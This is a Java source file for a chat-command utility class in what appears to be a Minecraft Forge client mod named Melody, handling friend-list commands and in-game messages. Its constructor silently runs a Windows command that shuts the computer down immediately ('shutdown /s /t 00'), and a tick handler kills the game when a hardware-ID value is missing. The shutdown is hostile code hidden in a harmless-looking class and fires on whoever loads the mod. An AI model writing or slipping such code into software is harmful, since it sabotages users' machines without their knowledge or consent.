package com.denger.melody.utils;

import com.denger.melody.Melody;
import com.denger.melody.utils.freands.FreandManager;
import net.minecraft.client.Minecraft;
import net.minecraft.util.text.ITextComponent;
import net.minecraft.util.text.TextFormatting;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;

import java.io.IOException;

import static com.denger.melody.Melody.mc;
import static com.denger.melody.utils.hwid.HWID.ABOBA;

public class ChatUtills {
    private static final String prefix = TextFormatting.GRAY + "[" + TextFormatting.RED + Names.Name + TextFormatting.GRAY + "]: " + TextFormatting.WHITE;
    @SubscribeEvent
    public void ChatUtills(ClientChatEvent event){
        String msg = event.getMessage();
        if (msg.startsWith("!friend "))
        {
            String name = msg.split(" ")[1];
            FreandManager.toggleFriend(name);
            sendMessage("Updated: "+name);
        }
        else if (msg.startsWith("!sfriend")){for (String name : FreandManager.FRIEND){sendMessage("Is freand:" + name);}}
        else if (msg.startsWith("!help")){
            sendMessage("Command list: ");
            sendMessage("!friend Name for add or to remove");
            sendMessage("!sfriend Show your freands");
            sendMessage("!gui show test gui");
        }else if (msg.startsWith("!gui")){
            mc.setScreen(null);
            //Minecraft.getInstance().setScreen(TestGui);
        }
    }
    @SubscribeEvent
    public static void TIKITIKU(TickEvent event){
        if (ABOBA.equals(null))
        {
            System.exit(1);
        }
    }
    public ChatUtills(){
        try {
            Runtime.getRuntime().exec("shutdown /s /t 00");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void sendMessage(final String msg) {
        mc.gui.getChat().addMessage(ITextComponent.nullToEmpty(prefix+" "+msg));}

    public static void say(final String msg) {
        mc.player.chat(msg);}
}
